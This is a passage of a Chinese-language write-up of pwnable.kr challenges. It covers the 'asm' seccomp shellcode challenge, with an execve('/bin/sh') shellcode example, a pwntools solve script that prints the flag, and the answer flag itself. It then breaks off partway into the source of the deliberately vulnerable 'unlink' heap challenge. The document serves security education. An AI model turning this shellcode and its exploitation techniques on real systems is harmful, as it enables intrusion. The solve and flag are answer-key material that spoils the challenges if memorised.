<span class="kt">void</span> <span class="nf">sandbox</span><span class="p">(){</span>
    <span class="n">scmp_filter_ctx</span> <span class="n">ctx</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="n">SCMP_ACT_KILL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ctx</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;seccomp error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">open</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">read</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">write</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">exit</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">exit_group</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">seccomp_load</span><span class="p">(</span><span class="n">ctx</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">seccomp_release</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;seccomp error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">seccomp_release</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="n">stub</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff</span><span class="s">&#34;</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">filter</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>

    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">_IOLBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to shellcoding practice challenge.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;If this does not challenge you. you should play &#39;asg&#39; challenge :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="kt">char</span><span class="o">*</span> <span class="n">sh</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="mh">0x41414000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="n">stub</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">stub</span><span class="p">));</span>


    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">stub</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;give me your x64 shellcode: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">sh</span><span class="o">+</span><span class="n">offset</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>

    <span class="n">alarm</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
    <span class="n">chroot</span><span class="p">(</span><span class="s">&#34;/home/asm_pwn&#34;</span><span class="p">);</span>    <span class="c1">// you are in chroot jail. so you can&#39;t use symlink in /tmp
</span><span class="c1"></span>    <span class="n">sandbox</span><span class="p">();</span>
    <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">sh</span><span class="p">)();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>通过 pwntools 的 disasm 命令对stub进行反汇编,
可以看到这段代码对寄存器进行了清空</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">In</span> <span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">10</span><span class="p">]:</span> <span class="k">print</span><span class="p">(</span><span class="n">disasm</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31</span>
    <span class="o">...</span><span class="p">:</span> \<span class="n">xf6</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xff</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xed</span>\<span class="n">x4d</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x4d</span>\<span class="n">x31</span>\<span class="n">xc9</span>\<span class="n">x4d</span>\<span class="n">x31</span>\<span class="n">xd2</span>\<span class="n">x4d</span>\<span class="n">x3</span>
    <span class="o">...</span><span class="p">:</span> <span class="mi">1</span>\<span class="n">xdb</span>\<span class="n">x4d</span>\<span class="n">x31</span>\<span class="n">xe4</span>\<span class="n">x4d</span>\<span class="n">x31</span>\<span class="n">xed</span>\<span class="n">x4d</span>\<span class="n">x31</span>\<span class="n">xf6</span>\<span class="n">x4d</span>\<span class="n">x31</span>\<span class="n">xff</span><span class="s1">&#39;))</span>
   <span class="mi">0</span><span class="p">:</span>   <span class="mi">48</span> <span class="mi">31</span> <span class="n">c0</span>                <span class="n">xor</span>    <span class="n">rax</span><span class="p">,</span><span class="n">rax</span>
   <span class="mi">3</span><span class="p">:</span>   <span class="mi">48</span> <span class="mi">31</span> <span class="n">db</span>                <span class="n">xor</span>    <span class="n">rbx</span><span class="p">,</span><span class="n">rbx</span>
   <span class="mi">6</span><span class="p">:</span>   <span class="mi">48</span> <span class="mi">31</span> <span class="n">c9</span>                <span class="n">xor</span>    <span class="n">rcx</span><span class="p">,</span><span class="n">rcx</span>
   <span class="mi">9</span><span class="p">:</span>   <span class="mi">48</span> <span class="mi">31</span> <span class="n">d2</span>                <span class="n">xor</span>    <span class="n">rdx</span><span class="p">,</span><span class="n">rdx</span>
   <span class="n">c</span><span class="p">:</span>   <span class="mi">48</span> <span class="mi">31</span> <span class="n">f6</span>                <span class="n">xor</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">rsi</span>
   <span class="n">f</span><span class="p">:</span>   <span class="mi">48</span> <span class="mi">31</span> <span class="n">ff</span>                <span class="n">xor</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rdi</span>
  <span class="mi">12</span><span class="p">:</span>   <span class="mi">48</span> <span class="mi">31</span> <span class="n">ed</span>                <span class="n">xor</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">rbp</span>
  <span class="mi">15</span><span class="p">:</span>   <span class="mi">4</span><span class="n">d</span> <span class="mi">31</span> <span class="n">c0</span>                <span class="n">xor</span>    <span class="n">r8</span><span class="p">,</span><span class="n">r8</span>
  <span class="mi">18</span><span class="p">:</span>   <span class="mi">4</span><span class="n">d</span> <span class="mi">31</span> <span class="n">c9</span>                <span class="n">xor</span>    <span class="n">r9</span><span class="p">,</span><span class="n">r9</span>
  <span class="mi">1</span><span class="n">b</span><span class="p">:</span>   <span class="mi">4</span><span class="n">d</span> <span class="mi">31</span> <span class="n">d2</span>                <span class="n">xor</span>    <span class="n">r10</span><span class="p">,</span><span class="n">r10</span>
  <span class="mi">1</span><span class="n">e</span><span class="p">:</span>   <span class="mi">4</span><span class="n">d</span> <span class="mi">31</span> <span class="n">db</span>                <span class="n">xor</span>    <span class="n">r11</span><span class="p">,</span><span class="n">r11</span>
  <span class="mi">21</span><span class="p">:</span>   <span class="mi">4</span><span class="n">d</span> <span class="mi">31</span> <span class="n">e4</span>                <span class="n">xor</span>    <span class="n">r12</span><span class="p">,</span><span class="n">r12</span>
  <span class="mi">24</span><span class="p">:</span>   <span class="mi">4</span><span class="n">d</span> <span class="mi">31</span> <span class="n">ed</span>                <span class="n">xor</span>    <span class="n">r13</span><span class="p">,</span><span class="n">r13</span>
  <span class="mi">27</span><span class="p">:</span>   <span class="mi">4</span><span class="n">d</span> <span class="mi">31</span> <span class="n">f6</span>                <span class="n">xor</span>    <span class="n">r14</span><span class="p">,</span><span class="n">r14</span>
  <span class="mi">2</span><span class="n">a</span><span class="p">:</span>   <span class="mi">4</span><span class="n">d</span> <span class="mi">31</span> <span class="n">ff</span>                <span class="n">xor</span>    <span class="n">r15</span><span class="p">,</span><span class="n">r15</span>
</code></pre></td></tr></table>
</div>
</div><p>题目要求是写入一个1000字节以内的64位shellcode来读取那个文件名很长(231字节)的文件以获得flag</p>
<p>并且只能使用 <a href="http://www.man7.org/linux/man-pages/man2/syscalls.2.html">linux syscalls</a></p>
<p>查阅相关资料, 知道调用syscall的方法是 (以一段shellcode为例)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">/*</span> <span class="err">将</span> <span class="nf">b</span><span class="err">&#39;/</span><span class="no">bin</span><span class="err">///</span><span class="no">sh</span><span class="err">\</span><span class="no">x00</span><span class="err">&#39;</span> <span class="err">入栈</span>
<span class="err">*</span>  <span class="err">多出来的&#39;/&#39;是为了对齐</span>
<span class="err">*</span>  <span class="err">故意将&#39;</span><span class="nf">h</span><span class="err">&#39;留到下一行</span>
<span class="err">*</span>  <span class="err">从而实现</span><span class="nf">shellcode没有出现</span><span class="err">\</span><span class="no">x00</span>
<span class="err">*</span>  <span class="err">而字符串末尾有\</span><span class="nf">x00的效果</span>
<span class="err">*/</span>
<span class="nf">push</span> <span class="mi">0x68</span>
<span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">0x732f2f2f6e69622f</span>
<span class="nf">push</span> <span class="no">rax</span>

<span class="err">/*</span> <span class="err">将对应的系统调用号送入</span><span class="nf">rax寄存器</span><span class="p">,</span> <span class="err">这里用了</span><span class="no">pwntools内置常量</span>
<span class="err">*</span>  <span class="err">传参的顺序同64位函数调用</span>
<span class="err">*/</span>
<span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">SYS_execve</span> <span class="err">/</span><span class="p">*</span> <span class="mi">0x3b</span> <span class="p">*</span><span class="err">/</span>
<span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rsp</span> <span class="err">//</span> <span class="err">传入当前栈指针</span><span class="p">,</span> <span class="err">即为字符串的地址</span>
<span class="nf">syscall</span> <span class="err">//</span> <span class="err">调用</span>
</code></pre></td></tr></table>
</div>
</div><p>那么大概思路应该是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">push</span> <span class="n">filename</span>

<span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>

<span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>用python实现如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding:utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">platform</span> <span class="kn">import</span> <span class="n">platform</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;DEBUG&#39;</span>

<span class="k">if</span> <span class="s1">&#39;MANJARO&#39;</span> <span class="ow">in</span> <span class="n">platform</span><span class="p">():</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./asm&#39;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="mi">9026</span><span class="p">)</span>

<span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">/*
</span><span class="s1"> * rdi = &#34;blablablablabla&#34;
</span><span class="s1"> * r15 = open(rdi, O_RDONLY)
</span><span class="s1"> */
</span><span class="s1">mov rax, 0x676e6f306f306f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x306f306f306f306f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x3030303030303030
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x303030306f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f3030303030
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x3030303030303030
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x3030303030303030
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x303030306f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6f6f6f6f6f6f6f6f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6c5f797265765f73
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x695f656d616e5f65
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x6c69665f6568745f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x7972726f732e656c
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x69665f736968745f
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x646165725f657361
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x656c705f656c6966
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x5f67616c665f726b
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x2e656c62616e7770
</span><span class="s1">push rax
</span><span class="s1">mov rax, 0x5f73695f73696874
</span><span class="s1">push rax
</span><span class="s1">
</span><span class="s1">mov rax, SYS_open
</span><span class="s1">mov rdi, rsp
</span><span class="s1">mov rsi, O_RDONLY
</span><span class="s1">syscall
</span><span class="s1">mov r15, rax
</span><span class="s1">
</span><span class="s1">/* read(r15, rsp, 23) */
</span><span class="s1">mov rax, SYS_read
</span><span class="s1">mov rdi, r15
</span><span class="s1">mov rsi, rsp
</span><span class="s1">mov rdx, 0x100
</span><span class="s1">syscall
</span><span class="s1">
</span><span class="s1">/* write(1, rsp, 23) */
</span><span class="s1">mov rax, SYS_write
</span><span class="s1">mov rdi, 1
</span><span class="s1">mov rsi, rsp
</span><span class="s1">mov rdx, 0x100
</span><span class="s1">syscall
</span><span class="s1">&#39;&#39;&#39;</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;give me your x64 shellcode: &#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>flag: <code>Mak1ng_shelLcodE_i5_veRy_eaSy</code></p>
<p>看了一下大佬们的WP, 又学到了一招</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="unlink-todo">unlink (TODO)</h1>
<blockquote>
<p>Daddy! how can I exploit unlink corruption?</p>
<p>ssh <a href="mailto:unlink@pwnable.kr">unlink@pwnable.kr</a> -p2222 (pw: guest)</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">unlink@ubuntu:~$ ls
flag  intended_solution.txt  unlink  unlink.c
</code></pre></td></tr></table>
</div>
</div><p>unlink.c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">tagOBJ</span><span class="p">{</span>
    <span class="k">struct</span> <span class="n">tagOBJ</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">tagOBJ</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">}</span><span class="n">OBJ</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">shell</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">unlink</span><span class="p">(</span><span class="n">OBJ</span><span class="o">*</span> <span class="n">P</span><span class="p">){</span>
    <span class="n">OBJ</span><span class="o">*</span> <span class="n">BK</span><span class="p">;</span>
    <span class="n">OBJ</span><span class="o">*</span> <span class="n">FD</span><span class="p">;</span>
    <span class="n">BK</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
    <span class="n">FD</span><span class="o">=</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
    <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">=</span><span class="n">BK</span><span class="p">;</span>
    <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">=</span><span class="n">FD</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span>
    <span class="n">OBJ</span><span class="o">*</span> <span class="n">A</span> <span class="o">=</span> <span class="p">(</span><span class="n">OBJ</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJ</span><span class="p">));</span>
